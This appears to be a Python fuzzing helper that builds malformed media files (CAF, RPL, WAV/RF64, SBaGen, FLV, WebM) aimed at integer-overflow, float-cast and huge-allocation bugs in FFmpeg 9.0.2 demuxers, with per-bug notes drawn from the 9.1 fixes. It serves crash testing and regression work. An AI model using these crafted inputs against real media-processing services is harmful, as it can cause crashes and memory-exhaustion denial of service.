#!/usr/bin/env python3
"""Potential crash seeds aimed at FFmpeg 9.0.2.

Derived from the 9.0.2 -> 9.1 source diff read in the *fix* direction: every seed
reaches a demuxer path that 9.0.2 ships unguarded and 9.1 hardened, so any crash
it produces is 9.0.2-only. 9.1 is a feature release, so its Changelog lists no
per-bug titles (unlike the 8.0.3 pack, which mined the 8.1.x maintenance
Changelog); the candidates below come from the libavformat tree diff instead.

Most of 9.0.2's security fixes were also backported from master, so the genuine
9.0.2-only delta is small and dominated by integer-overflow / large-allocation
hardening rather than fresh OOB (those landed in both branches); the rest is
float-cast hardening — NaN or out-of-range doubles stored into int64 — which the
ubsan builds catch (`-fsanitize=undefined` includes float-cast-overflow).
The confirmed hand-craftable hunks:

  caf  (libavformat/cafdec.c read_pakt_chunk): `st->nb_frames += priming` /
       `+= remainder` with no prior range check. 9.1 adds
       `if (st->nb_frames < 0 || INT64_MAX - priming - caf->remainder < st->nb_frames)`.
       -> signed int64 overflow (UBSAN) with nb_frames = INT64_MAX.

  rpl  (libavformat/rpl.c index loop): `av_add_index_entry(ast, offset + video_size, ...)`
       runs before the overflow check. 9.1 moves the check up and adds
       `video_size < 0 || offset > INT64_MAX - video_size`.
       -> signed int64 overflow (UBSAN) in `offset + video_size`.

  wav  (libavformat/wavdec.c wav_parse_bext_tag): `size -= 602; av_malloc(size + 1)`
       with size straight from the chunk header. 9.1 caps the coding history at 1 MiB.
       -> up to ~4 GiB allocation (OOM / memory-DoS probe).

  sbg  (libavformat/sbgdec.c scale_double): strtod accepts 'nan'; NaN fails both
       `m < INT_MIN` and `m >= INT_MAX`, so `*r = m` casts NaN to int. 9.1 adds
       isnan(m). sbg_read_probe parses the whole script, so this already fires
       during avformat_open_input's format detection.
       -> float-cast-overflow (UBSAN).

  flv  (libavformat/flvdec.c amf_parse_object): `s->duration = num_val *
       AV_TIME_BASE` with num_val a raw AMF double; NaN stays NaN through the
       multiply. 9.1 gates duration / videodatarate / audiodatarate.
       -> float-cast-overflow (UBSAN).

  webm (libavformat/matroskadec.c matroska_read_header): `ctx->duration =
       duration * time_scale * 1000 / AV_TIME_BASE` guards only isnan(duration);
       a finite huge double overflows the int64 store. 9.1 also rejects
       duration < 0 and duration >= INT64_MAX / time_scale.
       -> float-cast-overflow (UBSAN).

  rf64 (libavformat/wavdec.c wav_read_header): the ds64 data_size saturates
       av_sat_add64 into data_end = INT64_MAX; `next_tag_ofs = data_end +
       (data_size & 1)` then adds 1. 9.1 wraps that add in av_sat_add64.
       -> signed int64 overflow (UBSAN).

Analyzed but not crafted (weak or needs a real baseline, not a magic seed):
  nsvdec.c  `vsize -= auxsize + 6` unsigned underflow -> large av_get_packet (ENOMEM).
  flvdec.c  keyframe `arraylen`: 9.1 bounds it by the metadata tag size; still an
            ENOMEM probe, not a crash.
  mov.c     v2 audio sample entry: `sample_rate = av_int2double(avio_rb64())` with no
            NaN/range check (9.1 rejects it), plus the elst edit-list and tmap
            extent_offset overflows; all need a full moov/trak/stsd, so they
            belong in the mint-baseline path, not a crafted magic seed.
  flacdec.c SEEKTABLE `index_entries[i].pos += metadata_head_size` overflow:
            gated behind AVFMT_FLAG_FAST_SEEK, which ffmpeg_read.c never sets.
  wtvdec.c  sector-table accounting fix: real bug, but the WTV container is too
            heavy to hand-craft as a seed.
  mtv.c     zero video_fps: 9.1 rejects it, but 9.0.2's avpriv_set_pts_info only
            logs "invalid timebase" and continues — correctness fix, no crash.

Usage:
    python tools/gen_ffmpeg_91_seeds.py [--out DIR]

Output is written to <out>/seeds/ (the layout load_corpus reads); --out
defaults to ~/fuzzing/ffmpeg_91_potential_crashes. Offline; not wired into `fuzz`.
"""

import argparse
import os
import struct
import tempfile

DEFAULT_OUT = os.path.expanduser("~/fuzzing/ffmpeg_91_potential_crashes")

INT64_MAX = 0x7FFFFFFFFFFFFFFF

# wav_parse_bext_tag consumes a fixed 602-byte BEXT prologue before the coding
# history; anything past it (size - 602 bytes) drives the allocation we target.
BEXT_FIXED_SIZE = 602
# ~1 GiB of declared-but-absent coding history: large enough to be a clear OOM
# probe, small enough that av_malloc may still succeed and then the short read fails.
BEXT_HISTORY = 0x40000000

# Quiet NaN for the AMF double: av_int2double keeps the bits and every compare
# in amf_parse_object propagates the NaN into the int64 duration store.
AMF_NAN = 0x7FF8000000000000
# flv probe() requires DataOffset + 100 < buf_size, so the file must outsize its tag.
FLV_PAD_TO = 128
# 1e18 * 1e6 (default time_scale) * 1000 / AV_TIME_BASE = 1e21: finite in
# double but past INT64_MAX, so 9.0.2's isnan-only guard misses it.
WEBM_DURATION = 1e18


def le32(v):
    return struct.pack("<I", v)


def le16(v):
    return struct.pack("<H", v)


def le64(v):
    return struct.pack("<Q", v)


def be32(v):
    return struct.pack(">I", v)


def be16(v):
    return struct.pack(">H", v)


def be24(v):
    return struct.pack(">I", v)[1:]


def be64(v):
    return struct.pack(">Q", v)


def caf_pakt_overflow():
    """caff + desc + pakt with nb_frames = INT64_MAX, priming = 1.

    read_pakt_chunk does `st->nb_frames += priming` before 9.1's range guard,
    so the add overflows signed int64 (UBSAN).
    """

    # desc payload is exactly 32 bytes: sample_rate(f64 BE), codec_tag(LE32),
    # flags, bytes_per_packet, frames_per_packet, channels, bits (BE32 each).
    desc = struct.pack(">d", 44100.0)  # sample_rate
    desc += le32(0)  # codec_tag (avio_rl32)
    desc += be32(0)  # format flags
    desc += be32(0)  # bytes_per_packet -> else-branch, no index loop
    desc += be32(0)  # frames_per_packet
    desc += be32(1)  # channels
    desc += be32(16)  # bits_per_coded_sample
    assert len(desc) == 32

    # pakt payload (24 bytes): num_packets, nb_frames, priming, remainder.
    pakt = be64(0)  # num_packets = 0 (passes the INT32_MAX/sizeof guard)
    pakt += be64(INT64_MAX)  # nb_frames = INT64_MAX
    pakt += be32(1)  # priming = 1  -> overflow on `nb_frames += priming`
    pakt += be32(0)  # remainder

    out = b"caff" + be16(1) + be16(0)  # magic, version 1, flags
    out += b"desc" + be64(32) + desc
    out += b"pakt" + be64(len(pakt)) + pakt
    return out


def rpl_idx_overflow():
    """ARMovie text header + one index row offset = INT64_MAX, video_size = 1.

    With an audio stream present, `av_add_index_entry(ast, offset + video_size, ...)`
    runs before 9.1's `offset > INT64_MAX - video_size` guard -> signed overflow.
    """

    # 20 header lines (video_format = 0 skips the video block and consumes 3
    # placeholder lines). fps (line 9) must have a non-zero leading int, else
    # read_fps sets the error flag and the index loop never runs.
    lines = [
        "ARMovie",  # 1  signature
        "t",  # 2  title
        "c",  # 3  copyright
        "a",  # 4  author
        "0",  # 5  video_format = 0 (no video stream)
        "0",  # 6  placeholder (else branch)
        "0",  # 7  placeholder
        "0",  # 8  placeholder
        "1",  # 9  fps (must be non-zero)
        "1",  # 10 audio_format != 0 -> create audio stream
        "1",  # 11 sample_rate
        "1",  # 12 channels (> 0)
        "8",  # 13 bits_per_coded_sample
        "0",  # 14 frames_per_chunk
        "0",  # 15 number_of_chunks (++ -> 1, loop runs once)
        "0",  # 16 even chunk size
        "0",  # 17 odd chunk size
        "000000",  # 18 chunk_catalog_offset (fixed 6 digits, patched below)
        "0",  # 19 helpful-sprite offset
        "0",  # 20 helpful-sprite size
    ]
    catalog_idx = 17  # 0-based index of the chunk_catalog_offset line

    # Leading zeros parse fine in read_int, so a fixed 6-digit field keeps the
    # header length constant: the catalog offset is just that total length.
    header = "\n".join(lines) + "\n"
    offset = len(header)
    assert offset < 10**6
    lines[catalog_idx] = f"{offset:06d}"
    header = "\n".join(lines) + "\n"
    assert len(header) == offset  # fixed width held

    index_row = f"{INT64_MAX} , 1 ; 0\n"
    return (header + index_row).encode()


def wav_bext_bigalloc():
    """RIFF/WAVE + bext chunk whose declared size forces a ~1 GiB allocation.

    9.0.2's wav_parse_bext_tag does `av_malloc(size - 602 + 1)` straight from
    the chunk header; 9.1 caps the coding history at 1 MiB.
    """

    bext_body = bytearray(BEXT_FIXED_SIZE)  # all-zero: version (offset 346) = 0
    bext_size = BEXT_FIXED_SIZE + BEXT_HISTORY

    chunk = b"bext" + le32(bext_size) + bytes(bext_body)
    payload = b"WAVE" + chunk
    return b"RIFF" + le32(len(payload)) + payload


def sbg_nan_cast():
    """SBaGen script with a NaN carrier: `a: nan`.

    lex_double uses strtod, which parses 'nan'. scale_double's range check
    compares NaN (both false), so `*r = m` casts NaN to int -- already inside
    sbg_read_probe, which runs parse_script on every probed file.
    """

    return b"a: nan\n"


def flv_amf_nan_duration():
    """FLV + onMetaData script tag whose duration is a NaN AMF double.

    amf_parse_object stores `num_val * AV_TIME_BASE` into the int64
    s->duration with no range check in 9.0.2; 9.1 gates num_val.
    """

    body = b"\x02" + be16(len("onMetaData")) + b"onMetaData"
    body += b"\x08" + be32(0)  # ECMA array, count 0
    body += be16(len("duration")) + b"duration"
    body += b"\x00" + be64(AMF_NAN)  # AMF number
    body += b"\x00\x00\x09"  # AMF_END_OF_OBJECT

    tag = bytes([18]) + be24(len(body)) + b"\x00" * 4 + b"\x00" * 3
    out = b"FLV" + bytes([1, 0]) + be32(9) + be32(0) + tag + body
    return out.ljust(FLV_PAD_TO, b"\x00")


def webm_duration_cast():
    """EBML/webm + Segment/Info whose Duration overflows the int64 store.

    matroska_read_header computes ctx->duration = duration * time_scale *
    1000 / AV_TIME_BASE; 9.0.2 only checks isnan(duration). The bare Cluster
    id ends the header parse (EBML_STOP) so the duration line is reached.
    """

    def vint(v):
        return bytes([0x80 | v])  # 1-byte size vint, all sizes here fit

    header = (
        b"\x42\x86\x81\x01"  # EBMLVersion = 1
        + b"\x42\xf7\x81\x01"  # EBMLReadVersion = 1
        + b"\x42\xf2\x81\x04"  # EBMLMaxIDLength = 4
        + b"\x42\xf3\x81\x08"  # EBMLMaxSizeLength = 8
        + b"\x42\x82\x84webm"  # DocType
        + b"\x42\x87\x81\x02"  # DocTypeVersion = 2
        + b"\x42\x85\x81\x02"  # DocTypeReadVersion = 2
    )

    info = b"\x44\x89" + vint(8) + struct.pack(">d", WEBM_DURATION)
    info_elem = b"\x15\x49\xa9\x66" + vint(len(info)) + info
    cluster = b"\x1f\x43\xb6\x75"  # id only: EBML_STOP needs no length

    seg = info_elem + cluster
    out = b"\x1a\x45\xdf\xa3" + vint(len(header)) + header
    return out + b"\x18\x53\x80\x67" + vint(len(seg)) + seg


def rf64_dataend_overflow():
    """RF64/WAVE + ds64(data_size = INT64_MAX) + fmt + data tag.

    The data tag makes wav->data_end = av_sat_add64(tell, INT64_MAX) saturate;
    9.0.2's `next_tag_ofs = data_end + (data_size & 1)` then adds 1 to
    INT64_MAX. fmt must precede data because the fuzz pb is not seekable.
    """

    fmt = (
        le16(1)  # PCM
        + le16(1)  # channels
        + le32(44100)  # sample rate
        + le32(88200)  # byte rate
        + le16(2)  # block align
        + le16(16)  # bits per sample
    )
    ds64 = le64(0) + le64(INT64_MAX) + le64(0) + le32(0)  # riff/data/sample/table

    out = b"RF64" + le32(0) + b"WAVE"
    out += b"ds64" + le32(len(ds64)) + ds64
    out += b"fmt " + le32(len(fmt)) + fmt
    out += b"data" + le32(0xFFFFFFFF)  # forces the rf64 branch, not the size one
    return out


SEEDS = {
    "caf_pakt_overflow.caf": caf_pakt_overflow,
    "rpl_idx_overflow.rpl": rpl_idx_overflow,
    "wav_bext_bigalloc.wav": wav_bext_bigalloc,
    "sbg_nan_cast.sbg": sbg_nan_cast,
    "flv_amf_nan_duration.flv": flv_amf_nan_duration,
    "webm_duration_cast.webm": webm_duration_cast,
    "rf64_dataend_overflow.wav": rf64_dataend_overflow,
}


def write_seeds(seeds_dir):
    """Write the crafted 9.0.2 crash seeds into ``seeds_dir``.

    ``seeds_dir`` must already be the ``seeds/`` directory ``load_corpus`` reads
    (``main`` appends it to ``--out``), not the pack root.

    Each seed is staged in the *parent* directory -- outside the scanned
    ``seeds/`` tree -- via an exclusive, uniquely named temp file, then
    atomically renamed into place. So:
      - load_corpus never sees a partial or temp file (it only scans seeds/);
      - a planted ``<name>.tmp`` symlink can't redirect the write (mkstemp uses
        O_CREAT|O_EXCL and a random name, so it neither follows nor reuses);
      - two concurrent runs can't collide on a fixed temp name.
    An interrupted run leaves no stray temp behind.
    """

    # Staging sibling of seeds/, on the same filesystem so os.replace is atomic.
    stage_dir = os.path.dirname(os.path.abspath(seeds_dir))

    for name, build in SEEDS.items():
        data = build()
        fd, tmp = tempfile.mkstemp(dir=stage_dir, prefix=f".{name}.", suffix=".part")

        try:
            with os.fdopen(fd, "wb") as f:
                f.write(data)
            os.replace(tmp, os.path.join(seeds_dir, name))  # atomic publish
        finally:
            # Only reached with tmp still present if write/replace failed.
            if os.path.exists(tmp):
                os.unlink(tmp)

        print(f"{name}: {len(data)}B")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "--out",
        default=DEFAULT_OUT,
        help="pack root; seeds are written to <out>/seeds/ (default: %(default)s)",
    )
    args = ap.parse_args()

    out = os.path.join(args.out, "seeds")
    os.makedirs(out, exist_ok=True)
    write_seeds(out)
    print("seeds dir:", out)


if __name__ == "__main__":
    main()
